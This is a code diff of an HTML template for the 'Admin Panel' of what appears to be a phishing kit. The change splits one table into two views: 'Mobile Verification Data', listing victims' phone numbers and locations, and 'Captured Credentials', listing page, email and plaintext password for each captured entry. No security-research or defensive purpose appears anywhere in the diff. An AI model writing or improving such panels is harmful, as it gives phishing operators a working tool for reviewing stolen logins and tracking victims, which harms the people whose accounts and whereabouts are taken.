@@ -2,24 +2,60 @@
 {% block content %}
 
 <h2>Admin Panel</h2>
-<table border="1" cellpadding="8">
-    <tr>
-        <th>ID</th>
-        <th>Page</th>
-        <th>Email</th>
-        <th>Password</th>
-        <th>Time</th>
-    </tr>
+<div style="display: flex; gap: 20px; align-items: flex-start;">
 
-    {% for row in data %}
-    <tr>
-        <td>{{ row.id }}</td>
-        <td>{{ row.page }}</td>
-        <td>{{ row.email }}</td>
-        <td>{{ row.password }}</td>
-        <td>{{ row.timestamp }}</td>
-    </tr>
-    {% endfor %}
-</table>
+    <!-- LEFT: Mobile Data (Phone & Location) -->
+    <div style="flex: 1;">
+        <h3>Mobile Verification Data</h3>
+        <table border="1" cellpadding="8" style="width: 100%;">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Phone</th>
+                    <th>Location</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for row in mobile_data %}
+                <tr>
+                    <td>{{ row.id }}</td>
+                    <td>{{ row.phone }}</td>
+                    <td>{{ row.location }}</td>
+                    <td>{{ row.timestamp.strftime('%Y-%m-%d %H:%M') }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+
+    <!-- RIGHT: Credentials (Email & Password) -->
+    <div style="flex: 1;">
+        <h3>Captured Credentials</h3>
+        <table border="1" cellpadding="8" style="width: 100%;">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Page</th>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for row in other_data %}
+                <tr>
+                    <td>{{ row.id }}</td>
+                    <td>{{ row.page }}</td>
+                    <td>{{ row.email }}</td>
+                    <td>{{ row.password }}</td>
+                    <td>{{ row.timestamp.strftime('%Y-%m-%d %H:%M') }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+
+</div>
 
 {% endblock %}
